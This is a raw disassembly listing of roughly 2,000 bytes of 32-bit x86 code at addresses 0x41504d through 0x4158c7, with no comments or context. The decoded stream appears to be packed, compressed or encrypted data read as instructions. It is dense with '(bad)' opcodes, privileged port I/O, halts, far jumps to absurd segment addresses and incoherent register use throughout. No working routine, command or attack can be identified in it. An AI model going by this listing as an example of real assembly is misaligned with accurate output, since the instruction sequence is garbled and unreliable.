  41504d:	imul   ebp,DWORD PTR ss:[edi+0x75e5cd36],0x5a
  415055:	rol    BYTE PTR [edx-0x68],0x1f
  415059:	rcr    eax,cl
  41505b:	sbb    BYTE PTR [edi+0x113dcbe9],ch
  415061:	fiadd  WORD PTR [esi-0x7e2cf515]
  415067:	mov    edi,0x3ddabdb8
  41506c:	out    dx,eax
  41506d:	cld    
  41506e:	pop    esi
  41506f:	pushf  
  415070:	in     al,dx
  415071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415072:	ins    BYTE PTR es:[edi],dx
  415073:	xor    eax,0x1bce2f01
  415078:	aas    
  415079:	push   edx
  41507a:	hlt    
  41507b:	dec    esp
  41507c:	dec    ebx
  41507d:	dec    esp
  41507e:	mov    eax,ds:0xff64f5c7
  415083:	add    bh,bl
  415085:	and    al,al
  415087:	mov    bh,0x1d
  415089:	push   ebx
  41508a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41508b:	aas    
  41508c:	lods   al,BYTE PTR ds:[esi]
  41508d:	push   ecx
  41508e:	into   
  41508f:	push   0xf0c76292
  415094:	test   BYTE PTR [eax+0x1f59ebe5],ch
  41509a:	push   edx
  41509b:	fst    QWORD PTR [eax-0x14db8347]
  4150a1:	and    ch,BYTE PTR [ebp+0x692a5144]
  4150a7:	in     al,dx
  4150a8:	ins    BYTE PTR es:[edi],dx
  4150a9:	add    al,0x6f
  4150ab:	(bad)  
  4150ac:	cmp    ecx,DWORD PTR [edi-0x1155bd8c]
  4150b2:	popa   
  4150b3:	addr16 push ebx
  4150b5:	ret    0xf182
  4150b8:	add    edx,0x42
  4150bb:	sbb    bh,BYTE PTR [ebx+0x7cd9a245]
  4150c1:	mov    bl,0x64
  4150c3:	lds    esi,FWORD PTR [edi]
  4150c5:	dec    ebp
  4150c6:	mov    cl,0x72
  4150c8:	test   ecx,0x9a254ae
  4150ce:	push   ecx
  4150cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150d0:	scas   eax,DWORD PTR es:[edi]
  4150d1:	push   esi
  4150d2:	popa   
  4150d3:	pop    esp
  4150d4:	add    eax,0xd99c0bbb
  4150d9:	(bad)  
  4150db:	pop    gs
  4150dd:	mov    edi,0xe3392973
  4150e2:	mov    bl,BYTE PTR [edi+0x7d]
  4150e5:	(bad)  
  4150e6:	push   esp
  4150e7:	sub    ecx,ebx
  4150e9:	sbb    eax,0xf674d612
  4150ee:	adc    ecx,DWORD PTR [eax]
  4150f0:	(bad)  
  4150f1:	out    0xb2,eax
  4150f3:	sar    cl,1
  4150f5:	xor    eax,0xb19acfc
  4150fa:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4150fc:	shl    BYTE PTR [edx+ebx*1-0x10530773],1
  415103:	push   eax
  415104:	pop    edi
  415105:	and    dh,BYTE PTR [ebx+0xb573b60]
  41510b:	sar    DWORD PTR [eax-0x55f2e4ae],1
  415111:	push   cs
  415112:	push   ds
  415113:	cld    
  415114:	out    dx,al
  415115:	mov    al,ds:0x279ea56c
  41511a:	or     BYTE PTR [edi+eax*1],dl
  41511d:	push   ebx
  41511e:	pop    edx
  41511f:	push   0x4e8b68ba
  415124:	clc    
  415125:	stos   BYTE PTR es:[edi],al
  415126:	and    BYTE PTR [edi-0x3e9afdf9],dh
  41512c:	push   ebp
  41512d:	jl     0x415198
  41512f:	push   ss
  415130:	mov    ds:0x65cf73e2,al
  415135:	ins    DWORD PTR es:[edi],dx
  415136:	ins    DWORD PTR es:[edi],dx
  415137:	idiv   esp
  415139:	or     dh,al
  41513b:	pop    esi
  41513c:	adc    bp,si
  41513f:	push   edi
  415140:	dec    esi
  415141:	repnz shl BYTE PTR [eax],cl
  415144:	in     al,dx
  415145:	jl     0x4150cb
  415147:	(bad)  
  415148:	repnz sahf 
  41514a:	adc    ecx,DWORD PTR ds:0xba9dea0c
  415150:	stos   DWORD PTR es:[edi],eax
  415151:	push   es
  415152:	pop    edi
  415153:	or     BYTE PTR [ecx],cl
  415155:	jle    0x41510a
  415157:	xor    eax,0xffdccdb9
  41515c:	mov    eax,ds:0xaa3b3a29
  415161:	sbb    BYTE PTR [edi-0x17],ah
  415164:	data16 sub dh,BYTE PTR [eax-0x8a7583f]
  41516b:	adc    eax,0x19300ae1
  415170:	repnz ins DWORD PTR es:[edi],dx
  415172:	xchg   ebx,eax
  415173:	test   DWORD PTR [edx],0x50d7d247
  415179:	push   gs
  41517b:	xor    BYTE PTR ds:[edi-0x1c],al
  41517f:	or     al,0x4b
  415181:	jne    0x415191
  415183:	xchg   DWORD PTR [edx-0x41],eax
  415186:	push   0x57
  415188:	shl    BYTE PTR [eax-0x63],1
  41518b:	scas   eax,DWORD PTR es:[edi]
  41518c:	xchg   ebx,eax
  41518d:	dec    ch
  41518f:	fwait
  415190:	add    cl,BYTE PTR [edx+0x52]
  415193:	cmp    DWORD PTR ds:[esi],ebp
  415196:	pop    esp
  415197:	faddp  st(1),st
  415199:	call   0xdcea85a7
  41519e:	cmp    esi,ebx
  4151a0:	aas    
  4151a1:	cmp    BYTE PTR [ebx+0xa],bh
  4151a4:	pop    ebx
  4151a5:	or     ebx,DWORD PTR [eax]
  4151a7:	fcom   DWORD PTR ds:0xb5e87237
  4151ad:	sbb    eax,0x11520758
  4151b2:	fstp   DWORD PTR [edi+0x7316a26a]
  4151b8:	aaa    
  4151b9:	sub    dh,al
  4151bb:	xchg   DWORD PTR [edi+0x6e7a94ad],esi
  4151c1:	xchg   ecx,eax
  4151c2:	repz ret 
  4151c4:	add    DWORD PTR [eax],0xffffff87
  4151c7:	mov    edi,0xd8af601e
  4151cc:	test   BYTE PTR [ebx-0x3ad08a2],al
  4151d2:	inc    ebp
  4151d3:	xor    eax,DWORD PTR [ebp+0x45]
  4151d6:	aas    
  4151d7:	xchg   edi,eax
  4151d8:	xchg   ebx,eax
  4151d9:	sti    
  4151da:	iret   
  4151db:	(bad)
  4151e0:	dec    edx
  4151e1:	arpl   WORD PTR [ebx],bp
  4151e3:	or     BYTE PTR [ecx-0x896f693],0x11
  4151ea:	xlat   BYTE PTR ds:[ebx]
  4151eb:	cmp    esp,DWORD PTR [ebx-0x78d01bbc]
  4151f1:	xchg   sp,ax
  4151f3:	jns    0x41522f
  4151f5:	ins    DWORD PTR es:[edi],dx
  4151f6:	xchg   DWORD PTR [ebx+eax*2+0x7a],ebx
  4151fa:	out    0xbe,al
  4151fc:	adc    eax,0xd9c735ad
  415201:	xor    esi,ecx
  415203:	cmp    al,0x0
  415205:	xor    al,0xca
  415207:	mov    ebx,0xa5c43467
  41520c:	mov    esp,0x98764169
  415211:	sti    
  415212:	and    ch,0x14
  415215:	sbb    eax,0x8e4827d0
  41521a:	mov    eax,ds:0x9aa0ee6
  41521f:	stos   BYTE PTR es:[edi],al
  415220:	add    dl,BYTE PTR [eax-0x26e45ba1]
  415226:	mov    esi,0x7d7d2b4e
  41522b:	push   es
  41522c:	or     ebp,DWORD PTR [edi+ebp*4]
  41522f:	aad    0xb6
  415231:	xor    al,0xb0
  415233:	push   ds
  415234:	rcl    BYTE PTR [ebx-0x61],1
  415237:	test   eax,0x3676855c
  41523c:	(bad)  
  41523d:	jl     0x415251
  41523f:	out    dx,al
  415240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415241:	test   DWORD PTR [edi+ebp*8-0x36],ebp
  415245:	(bad)  [esi]
  415247:	ds jl  0x415208
  41524a:	outs   dx,BYTE PTR ds:[esi]
  41524b:	aad    0xde
  41524d:	es rcl ch,0x3d
  415251:	cmp    eax,0xe88baf93
  415256:	inc    edx
  415257:	icebp  
  415258:	xchg   esp,eax
  415259:	popf   
  41525a:	xor    bl,bh
  41525c:	cdq    
  41525d:	ds aaa 
  41525f:	inc    eax
  415260:	int    0x7c
  415262:	ret    0x3253
  415265:	fld    st(3)
  415267:	mul    ah
  415269:	in     al,0xe2
  41526b:	jmp    0x32f76f21
  415270:	cmp    eax,0x9315e247
  415275:	mov    esi,0x2b683cc0
  41527a:	cmp    DWORD PTR [ebp+0x3b89307c],ebp
  415280:	dec    edi
  415281:	out    dx,eax
  415282:	push   ecx
  415283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415284:	sbb    al,0xe9
  415286:	push   edi
  415287:	add    al,0xb
  415289:	retf   0xba4d
  41528c:	add    BYTE PTR [edx+0x31],0xab
  415290:	das    
  415291:	adc    dl,BYTE PTR [esi]
  415293:	or     ebx,DWORD PTR es:[ebx+0x2e]
  415297:	iret   
  415298:	call   0xdddd:0x598d3104
  41529f:	iret   
  4152a0:	rdtsc  
  4152a2:	int3   
  4152a3:	fimul  DWORD PTR [edx+0x4c]
  4152a6:	xor    BYTE PTR [esi+0x1],bl
  4152a9:	sbb    eax,DWORD PTR [ebx-0x34cf128]
  4152af:	mov    ebp,0x94fe6d63
  4152b5:	push   ebp
  4152b6:	sti    
  4152b7:	lods   eax,DWORD PTR ds:[esi]
  4152b8:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4152ba:	add    ecx,ecx
  4152bc:	sub    DWORD PTR [ebx+ebp*4-0x67],ebp
  4152c0:	dec    ebx
  4152c1:	push   esp
  4152c2:	cdq    
  4152c3:	arpl   WORD PTR [ecx],dx
  4152c5:	or     cl,ah
  4152c7:	adc    ecx,esp
  4152c9:	into   
  4152ca:	dec    edx
  4152cb:	int3   
  4152cc:	cmp    BYTE PTR [ebp+0x79e6dd10],cl
  4152d2:	mov    edi,0x3421c8f4
  4152d7:	mov    ch,0xc0
  4152d9:	mov    DWORD PTR [ebp+0x5f],ecx
  4152dc:	in     eax,0x20
  4152de:	jmp    DWORD PTR [edx+0x44]
  4152e1:	(bad)  
  4152e2:	in     eax,0x4c
  4152e4:	and    DWORD PTR ds:[ecx+0x1ea74a67],ebp
  4152eb:	adc    cl,ch
  4152ed:	retf   0xdbae
  4152f0:	pop    ecx
  4152f1:	fadd   DWORD PTR [edi]
  4152f3:	mov    ch,0x45
  4152f5:	pushf  
  4152f6:	push   0xffffff8e
  4152f8:	adc    DWORD PTR [ecx+ebp*1-0x5724178],ecx
  4152ff:	jmp    0x41537f
  415301:	retf   0xb1e1
  415304:	es push cs
  415306:	cmp    DWORD PTR [ecx-0x6f],eax
  415309:	inc    edx
  41530a:	ins    DWORD PTR es:[edi],dx
  41530b:	fwait
  41530c:	jge    0x415335
  41530e:	inc    ebx
  41530f:	jae    0x41531b
  415311:	in     al,dx
  415312:	cs test al,0xe8
  415315:	mov    ecx,0x753e4d32
  41531a:	xor    bh,0xfe
  41531d:	xchg   esi,eax
  41531e:	dec    ebp
  41531f:	cs mov bh,0xb2
  415322:	lea    esp,[edx-0x8]
  415325:	and    al,BYTE PTR [esi+0x2c]
  415328:	fisttp DWORD PTR [esi+0x2c]
  41532b:	lods   eax,DWORD PTR ss:[esi]
  41532d:	ins    BYTE PTR es:[edi],dx
  41532e:	lods   eax,DWORD PTR ds:[esi]
  41532f:	add    al,BYTE PTR [ebp+0x5241edcb]
  415335:	cmp    al,0x3b
  415337:	cwde   
  415338:	das    
  415339:	and    al,0x23
  41533b:	add    eax,0xef5c23aa
  415340:	pushf  
  415341:	call   0x79fe:0xb141d3cd
  415348:	aam    0x74
  41534a:	ds dec esp
  41534c:	nop
  41534d:	and    al,0x95
  41534f:	mov    ecx,0x73668fe
  415354:	ds retf 
  415356:	(bad)  
  415357:	popf   
  415358:	imul   esi,DWORD PTR [esi-0x62],0xffffffb9
  41535c:	sub    dh,cl
  41535e:	sub    eax,0xee64d4b0
  415363:	push   edi
  415364:	aam    0xd6
  415366:	call   0xb6d5:0x7f100e83
  41536d:	mov    ?,WORD PTR [edx]
  41536f:	pushf  
  415370:	inc    esp
  415371:	sub    DWORD PTR [edi+0x36],ebx
  415374:	fcmovnu st,st(3)
  415376:	sbb    eax,0xe5a95a0e
  41537b:	fbstp  TBYTE PTR [eax-0x15]
  41537e:	inc    esi
  41537f:	push   ecx
  415380:	add    ebx,ebp
  415382:	mov    edi,0x88839991
  415387:	cmp    al,0xfe
  415389:	sbb    BYTE PTR [esi+esi*4-0x4d20a3bd],bh
  415390:	mov    ebp,0x424b08d0
  415395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415396:	(bad)
  415399:	stos   DWORD PTR es:[edi],eax
  41539a:	popf   
  41539b:	jno    0x4153d8
  41539d:	shl    BYTE PTR [esi+0x6609e3fa],1
  4153a3:	jno    0x4153c8
  4153a5:	jne    0x415351
  4153a7:	pop    ds
  4153a8:	ins    BYTE PTR es:[edi],dx
  4153a9:	popa   
  4153aa:	push   ds
  4153ab:	pop    esp
  4153ac:	mov    esi,0xba23ebe3
  4153b1:	jb     0x41534b
  4153b3:	or     cl,BYTE PTR [edi+0x31]
  4153b6:	rcl    edx,0x48
  4153b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153ba:	push   esp
  4153bb:	lods   eax,DWORD PTR ds:[esi]
  4153bc:	mov    esp,0xfb93d603
  4153c1:	pop    ss
  4153c2:	jno    0x415414
  4153c4:	cmp    ecx,ecx
  4153c6:	stc    
  4153c7:	xchg   ah,al
  4153c9:	dec    edx
  4153ca:	std    
  4153cb:	(bad)  
  4153cc:	adc    DWORD PTR es:[edx+0x1e],ebx
  4153d0:	and    edi,DWORD PTR [eax]
  4153d2:	add    eax,DWORD PTR ds:[ebx-0x1c8d754c]
  4153d9:	shl    DWORD PTR [eax-0x5b],0x41
  4153dd:	out    0xfe,eax
  4153df:	fdiv   QWORD PTR [ecx]
  4153e1:	mov    edx,0x48aac929
  4153e6:	mov    edi,0x702138a3
  4153eb:	pop    ebp
  4153ec:	adc    BYTE PTR [edx-0x1984c186],dl
  4153f2:	adc    ebp,DWORD PTR [esi+0x15ec891]
  4153f8:	in     eax,dx
  4153f9:	mov    ds:0x563b4fc5,eax
  4153fe:	pop    eax
  4153ff:	popa   
  415400:	es inc esi
  415402:	mov    bh,0xd3
  415404:	cmp    al,0x6d
  415406:	mov    DWORD PTR [esi+0x67],ecx
  415409:	adc    eax,0xfa819741
  41540e:	es call 0xc029:0x3766c0ef
  415416:	sti    
  415417:	and    eax,0x2617c35f
  41541c:	add    DWORD PTR [esi+eiz*8],eax
  41541f:	sbb    BYTE PTR [esi+0x667b8f9f],cl
  415425:	mov    edi,0xe01d5336
  41542a:	cwde   
  41542b:	lods   al,BYTE PTR ds:[esi]
  41542c:	neg    DWORD PTR [eax+0x7f]
  41542f:	ret    0x79e3
  415432:	push   0xffffffca
  415434:	into   
  415435:	and    ch,BYTE PTR [edi-0x7062870b]
  41543b:	test   eax,0xaca7f4c
  415440:	leave  
  415441:	mov    ecx,0x860dbcfd
  415446:	cmp    bh,dl
  415448:	mov    eax,ds:0xac59f5b7
  41544d:	jo     0x415416
  41544f:	sbb    DWORD PTR [edx-0x4e],eax
  415452:	loop   0x4154b1
  415454:	jno    0x41542d
  415456:	inc    ebp
  415457:	dec    eax
  415458:	lds    ebx,FWORD PTR ds:0x7f98320d
  41545e:	outs   dx,BYTE PTR ds:[esi]
  41545f:	fld    QWORD PTR [ecx+ecx*2]
  415462:	inc    ecx
  415463:	inc    eax
  415464:	(bad)  
  415466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415467:	or     al,0x84
  415469:	jae    0x415432
  41546b:	aam    0xc4
  41546d:	pop    ds
  41546e:	fnstsw WORD PTR ds:0x4a187b55
  415474:	and    ax,0xdb4d
  415478:	cld    
  415479:	push   ecx
  41547a:	scas   eax,DWORD PTR es:[edi]
  41547b:	sbb    DWORD PTR [ecx+0x55],edx
  41547e:	or     al,0xab
  415480:	scas   al,BYTE PTR es:[edi]
  415481:	push   es
  415482:	retf   
  415483:	mov    esp,0x78aed824
  415488:	mov    ebx,0xc95d71d6
  41548d:	and    edx,esp
  41548f:	adc    al,0xf5
  415491:	dec    ebp
  415492:	stc    
  415493:	ins    DWORD PTR es:[edi],dx
  415494:	in     al,dx
	...
  415511:	add    BYTE PTR [eax],al
  415513:	add    BYTE PTR [edi-0x5c],ch
  415516:	daa    
  415517:	jbe    0x415508
  415519:	idiv   DWORD PTR [edi-0x43]
  41551c:	mov    ecx,0xad16f8af
  415521:	addr16 fwait
  415523:	pop    es
  415524:	push   ebp
  415525:	cli    
  415526:	add    BYTE PTR [eax],al
  415528:	imul   eax,DWORD PTR [edi],0x6c6a0000
  41552e:	mov    DWORD PTR ds:0x59d4a5f1,edi
  415534:	shl    esp,0x93
  415537:	or     esi,DWORD PTR [esi-0x65]
  41553a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41553b:	hlt    
  41553c:	dec    edx
  41553d:	scas   eax,DWORD PTR es:[edi]
  41553e:	sbb    bl,cl
  415540:	push   ds
  415541:	push   0x78
  415543:	ror    BYTE PTR [esi+0xa],0xec
  415547:	popf   
  415548:	mov    cl,0x58
  41554a:	mov    ds,WORD PTR [edx+ebx*1+0x619f2212]
  415551:	add    esp,eax
  415553:	xor    cl,0xdc
  415556:	outs   dx,BYTE PTR ds:[esi]
  415557:	xchg   esp,eax
  415558:	pop    edx
  415559:	into   
  41555a:	xchg   DWORD PTR [edi+0x6738b627],edx
  415560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415561:	mov    bp,WORD PTR [eax-0x45]
  415565:	xchg   ecx,eax
  415566:	and    edx,eax
  415568:	inc    BYTE PTR [ecx]
  41556a:	or     eax,0xee66d9dd
  41556f:	lods   eax,DWORD PTR ds:[esi]
  415570:	das    
  415571:	jb     0x41551a
  415573:	mov    bh,0x3b
  415575:	(bad)  
  415576:	dec    edx
  415577:	jae    0x41552f
  415579:	ss jge 0x41550e
  41557c:	lahf   
  41557d:	xchg   cx,ax
  41557f:	mov    ebx,0x9bf4bbb5
  415584:	and    eax,0xa64367f4
  415589:	and    BYTE PTR [ecx],ah
  41558b:	mov    ds:0x55c433a5,al
  415590:	and    al,BYTE PTR [esi-0x4]
  415593:	jb     0x4155a2
  415595:	stc    
  415596:	dec    ebp
  415597:	xor    eax,DWORD PTR [edx]
  415599:	mov    dh,ah
  41559b:	bound  esi,QWORD PTR [ebp+0x3102ae20]
  4155a1:	pop    ds
  4155a2:	push   edi
  4155a3:	dec    ecx
  4155a4:	imul   edx,DWORD PTR [ecx-0x361484fd],0xa0dc9488
  4155ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155af:	jnp    0x41553c
  4155b1:	mov    ebx,0x1f902e80
  4155b6:	addr16 out 0x9f,al
  4155b9:	pusha  
  4155ba:	pop    esi
  4155bb:	dec    ebx
  4155bc:	and    ebx,DWORD PTR [esi]
  4155be:	add    ecx,ebx
  4155c0:	and    DWORD PTR [ecx-0x2a8ce7c5],edx
  4155c6:	jmp    0x519d:0xf5f24b8f
  4155cd:	enter  0x310b,0x5
  4155d1:	or     bl,bh
  4155d3:	std    
  4155d4:	mov    edi,0x94299bdf
  4155d9:	shl    BYTE PTR [ecx-0x4d9176f9],1
  4155df:	ss inc ecx
  4155e1:	test   al,0xf8
  4155e3:	ret    0x1cd5
  4155e6:	and    dl,BYTE PTR [ecx]
  4155e8:	shr    BYTE PTR [ecx-0x3f],1
  4155eb:	leave  
  4155ec:	dec    edx
  4155ed:	xor    BYTE PTR [eax],ch
  4155ef:	out    dx,al
  4155f0:	and    DWORD PTR [edx-0x29],edx
  4155f3:	(bad)  
  4155f4:	ficom  WORD PTR [edi+0x43]
  4155f7:	(bad)
  4155fc:	imul   eax,DWORD PTR ds:0xcebde5cc,0xffffffe0
  415603:	ss inc ebx
  415605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415606:	mov    ah,0x1b
  415608:	(bad)  
  415609:	push   es
  41560a:	inc    ebp
  41560b:	sti    
  41560c:	push   0x2ef8ff2e
  415611:	inc    eax
  415612:	inc    edx
  415613:	ja     0x415655
  415615:	push   esp
  415616:	xchg   esp,eax
  415617:	mov    esp,0x60172768
  41561c:	sbb    BYTE PTR [ecx],ah
  41561e:	imul   edi,DWORD PTR [esi-0x3bb1a19c],0x49
  415625:	call   edi
  415627:	xchg   ebp,eax
  415628:	(bad)  
  415629:	in     al,dx
  41562a:	sub    eax,0x9bc1e45b
  41562f:	or     DWORD PTR [edi-0x3b],edx
  415632:	sbb    DWORD PTR [eax],edi
  415634:	add    edx,DWORD PTR [ecx-0x33]
  415637:	or     eax,DWORD PTR [ebx+0x48]
  41563a:	cmp    DWORD PTR [edx],esp
  41563c:	push   esp
  41563d:	and    ch,dh
  41563f:	adc    al,0xe7
  415641:	push   ebx
  415642:	or     BYTE PTR [edi+ebx*4],ch
  415645:	lods   al,BYTE PTR ds:[esi]
  415646:	iret   
  415647:	mov    WORD PTR [ecx],?
  415649:	adc    BYTE PTR [esi],bh
  41564b:	sub    al,BYTE PTR [ecx-0x52]
  41564e:	mov    al,ds:0x80170197
  415653:	dec    ecx
  415654:	and    esi,DWORD PTR [eax-0x6603bd55]
  41565a:	push   ds
  41565b:	fsubr  QWORD PTR [ecx-0x6b53a52c]
  415661:	mov    eax,ds:0xf2e7c713
  415666:	jmp    0xe0b:0xdfa091cc
  41566d:	adc    al,0x15
  41566f:	and    eax,0xa155fbbb
  415674:	sbb    DWORD PTR [ebp+eiz*8+0x6b],ecx
  415678:	dec    edx
  415679:	lods   al,BYTE PTR ds:[esi]
  41567a:	test   al,0x58
  41567c:	lods   eax,DWORD PTR ds:[esi]
  41567d:	fadd   QWORD PTR ds:0xc169961b
  415683:	pop    ebp
  415684:	ret    0xe24f
  415687:	out    0x5c,al
  415689:	push   edx
  41568a:	push   cs
  41568b:	cwde   
  41568c:	inc    eax
  41568d:	outs   dx,DWORD PTR ds:[esi]
  41568e:	or     ebx,edi
  415690:	mov    ebx,0x40186e07
  415696:	xchg   ecx,eax
  415697:	push   esp
  415698:	jmp    0x4156b1
  41569a:	mov    ah,0x29
  41569c:	pop    esp
  41569d:	jmp    0xd259:0x2ed4f829
  4156a4:	jmp    0x41563f
  4156a6:	(bad)  
  4156a7:	call   0xe076a5a5
  4156ac:	fadd   QWORD PTR [eax-0x4e]
  4156af:	out    0xda,eax
  4156b1:	adc    DWORD PTR [ebp+0x45051697],ebx
  4156b7:	add    DWORD PTR [ecx+0x469e4caa],ecx
  4156bd:	outs   dx,BYTE PTR ds:[esi]
  4156be:	(bad)  
  4156bf:	std    
  4156c0:	cmc    
  4156c1:	in     eax,0x8e
  4156c3:	rol    DWORD PTR [edi],0x75
  4156c6:	lods   eax,DWORD PTR ds:[esi]
  4156c7:	or     eax,0x4385a015
  4156cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156cd:	std    
  4156ce:	pop    esi
  4156cf:	push   esi
  4156d0:	inc    esp
  4156d1:	cmp    dh,BYTE PTR [edx]
  4156d3:	or     edx,edi
  4156d5:	add    BYTE PTR [eax],0x51
  4156d8:	test   DWORD PTR [ebx+0x23],0xf9b8bf67
  4156df:	sub    ecx,DWORD PTR [ecx-0x4d]
  4156e2:	xchg   DWORD PTR [edi-0x35],ebx
  4156e5:	inc    edx
  4156e6:	jbe    0x4156ec
  4156e8:	pop    ecx
  4156e9:	mov    eax,DWORD PTR [ecx]
  4156eb:	clc    
  4156ec:	and    DWORD PTR [ebp+edi*1-0x39d11bab],esp
  4156f3:	in     eax,0x3f
  4156f5:	and    DWORD PTR [edx*4+0x4fa23f08],ebp
  4156fc:	or     DWORD PTR [edx+edi*1-0x6487e6e4],esp
  415703:	push   ebp
  415704:	jge    0x4156a7
  415706:	outs   dx,BYTE PTR ds:[esi]
  415707:	xchg   ecx,eax
  415708:	cld    
  415709:	loopne 0x415768
  41570b:	cmp    eax,0x742737ff
  415710:	jno    0x415753
  415712:	inc    esp
  415713:	mov    eax,ds:0xff5c4aa1
  415718:	mov    ch,0x74
  41571a:	bound  esp,QWORD PTR [ecx+0x341906fe]
  415720:	outs   dx,DWORD PTR ds:[esi]
  415721:	cs jg  0x4156f2
  415724:	in     eax,0xc0
  415726:	(bad)  
  415727:	push   ss
  415728:	sub    al,0x36
  41572a:	cmp    DWORD PTR [ecx-0x25816362],ebx
  415730:	fnstenv [edi-0x2b494453]
  415736:	clc    
  415737:	jo     0x4156e3
  415739:	test   BYTE PTR [esi-0x37a30349],dl
  41573f:	pop    ds
  415740:	repz fisttp QWORD PTR [esi-0xbc10d90]
  415747:	(bad)  
  415748:	int    0xa9
  41574a:	loope  0x41575b
  41574c:	and    BYTE PTR [eax+0x4d],dh
  41574f:	std    
  415750:	dec    esi
  415751:	rol    ecx,0x14
  415754:	xor    bl,BYTE PTR [ebx]
  415756:	ss stc 
  415758:	push   0xffffffe8
  41575a:	mov    dl,0x4f
  41575c:	fnstsw WORD PTR [esi-0x19]
  41575f:	mul    DWORD PTR [ebx+eiz*1]
  415762:	inc    edi
  415763:	xor    BYTE PTR [edi+esi*1],dh
  415766:	fnstsw WORD PTR [edi+0x35]
  415769:	je     0x4157d1
  41576b:	mov    al,ds:0x38f74ad2
  415770:	adc    ebp,DWORD PTR [ebx+0x2]
  415773:	push   0xffffffe7
  415775:	test   bh,dl
  415777:	jmp    0x4841fbb
  41577c:	cli    
  41577d:	cmp    eax,0xe850fd3
  415782:	imul   esp,DWORD PTR [esi+0x73],0x14c7a4e6
  415789:	or     al,0x9f
  41578b:	loop   0x4157c4
  41578d:	cmc    
  41578e:	std    
  41578f:	mov    ch,0xee
  415791:	adc    al,BYTE PTR [ecx-0x7d]
  415794:	adc    al,bh
  415796:	add    eax,0xbde94227
  41579b:	add    al,0x98
  41579d:	enter  0x5e59,0x80
  4157a1:	dec    ecx
  4157a2:	out    dx,eax
  4157a3:	cs jnp 0x415797
  4157a6:	dec    ecx
  4157a7:	jecxz  0x415772
  4157a9:	xlat   BYTE PTR ds:[ebx]
  4157aa:	je     0x4157d9
  4157ac:	call   0xe83cc7ef
  4157b1:	pop    ebp
  4157b2:	push   ss
  4157b3:	add    al,0xd5
  4157b5:	neg    DWORD PTR [ebp-0x5c]
  4157b8:	cmp    al,0x94
  4157ba:	and    ecx,DWORD PTR [edx]
  4157bc:	xor    eax,0x5bcb5b7d
  4157c1:	sbb    DWORD PTR ds:0xd46e3740,esp
  4157c7:	jmp    0x57f7:0x61dff76c
  4157ce:	call   FWORD PTR [ebx-0x7]
  4157d1:	add    cl,BYTE PTR [ebx+ebx*4-0x5af88a9e]
  4157d8:	cmp    DWORD PTR [esi-0x6f],eax
  4157db:	mov    dh,0x6f
  4157dd:	push   ebx
  4157de:	pop    esi
  4157df:	push   ds
  4157e0:	ja     0x4157e8
  4157e2:	add    cl,BYTE PTR [edi-0x61]
  4157e5:	jmp    0x41578f
  4157e7:	adc    esi,esi
  4157e9:	data16 jnp 0x41582b
  4157ec:	jmp    0xc6ac:0xd9964909
  4157f3:	and    DWORD PTR es:[esi+0x14f3a66c],eax
  4157fa:	arpl   WORD PTR [ebp-0x5828b150],si
  415800:	mov    DWORD PTR [ebp+0xa9e69c9],ebp
  415806:	pusha  
  415807:	xchg   DWORD PTR [ecx-0x8],esp
  41580a:	daa    
  41580b:	xchg   ecx,eax
  41580c:	addr16 loop 0x415800
  41580f:	iret   
  415810:	hlt    
  415811:	ja     0x415859
  415813:	pop    esi
  415814:	out    dx,al
  415815:	loop   0x415840
  415817:	adc    BYTE PTR [esi+0x4e],al
  41581a:	aaa    
  41581b:	imul   ebp,edi,0xffffff8d
  41581e:	das    
  41581f:	cmp    eax,0x6934b4c5
  415824:	arpl   WORD PTR [edi+eiz*2-0x187e7be3],bp
  41582b:	dec    edx
  41582c:	adc    eax,0x1d58e7d4
  415831:	bound  ecx,QWORD PTR [esi+0x3578df21]
  415837:	ret    
  415838:	pop    edx
  415839:	fs mov cl,cl
  41583c:	les    ecx,FWORD PTR ds:0x8ece3d5a
  415842:	push   esp
  415843:	hlt    
  415844:	and    DWORD PTR [ecx],0xffffffe0
  415847:	lods   eax,DWORD PTR ds:[esi]
  415848:	aas    
  415849:	out    dx,al
  41584a:	mov    bl,0x1c
  41584c:	ins    DWORD PTR es:[edi],dx
  41584d:	icebp  
  41584e:	mov    ah,0xf8
  415850:	fsub   DWORD PTR [edx+esi*2+0x29]
  415854:	inc    si
  415856:	jne    0x415879
  415858:	dec    esi
  415859:	sub    al,0xf7
  41585b:	jb     0x415850
  41585d:	add    ebx,ecx
  41585f:	pop    edi
  415860:	pop    edx
  415861:	push   ss
  415862:	ret    0xccde
  415865:	cli    
  415866:	xor    al,ah
  415868:	shr    edi,cl
  41586a:	inc    ebx
  41586b:	mov    bl,0xbd
  41586d:	lds    esp,FWORD PTR ds:[ecx+0x6ed5b1d5]
  415874:	nop
  415875:	cmp    eax,0xe17657d9
  41587a:	lods   eax,DWORD PTR ds:[esi]
  41587b:	sub    DWORD PTR [ecx+0x34fb61c6],ebp
  415881:	call   0xa891103f
  415886:	das    
  415887:	inc    esp
  415888:	add    eax,0x565e87c7
  41588d:	push   ecx
  41588e:	mov    ebx,0x2a68a815
  415893:	dec    esp
  415894:	inc    ebx
  415895:	or     DWORD PTR [edi+ebx*1+0x45b3009f],esi
  41589c:	xchg   ecx,eax
  41589d:	add    DWORD PTR [ecx-0x77],0xa2ff06a1
  4158a4:	idiv   BYTE PTR [ebx*2+0x770ec2aa]
  4158ab:	pop    ebp
  4158ac:	mov    dl,0x98
  4158ae:	ret    
  4158af:	pop    eax
  4158b0:	jns    0x415929
  4158b2:	in     eax,0xc6
  4158b4:	push   0xe104897d
  4158b9:	cmp    ah,BYTE PTR [ecx+0x3a]
  4158bc:	sbb    eax,0x67c227cc
  4158c1:	xchg   edx,eax
  4158c2:	mov    ds:0x7701e310,al
  4158c7:	mov    fs,WORD PTR [ebp-0x13]
